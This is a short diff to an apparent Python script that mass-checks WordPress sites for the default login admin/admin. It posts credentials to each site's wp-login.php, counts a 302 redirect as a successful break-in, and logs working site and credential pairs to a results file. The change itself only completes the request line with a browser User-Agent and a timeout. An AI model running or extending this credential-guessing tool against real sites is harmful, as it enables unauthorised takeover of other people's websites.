@@ -11,7 +11,8 @@ def login(site):
                 'wp-submit':'Log+In',
                 'redirect_to':site+'/wp-admin',
                 'testcookie':'1'}
-                response = requests.post(site + "/wp-login.php", data=datane,headers = {'User-Agent': 'Mozilla/5.0 (Win>                result = response.status_code
+                response = requests.post(site + "/wp-login.php", data=datane,headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'},timeout=10)              
+                result = response.status_code
                 if result == 302:
                         with open("result.txt", "a") as result_file:
                                 result_file.write(site+'/wp-login.php'+'|'+'admin'+'|'+'admin'+'\n')
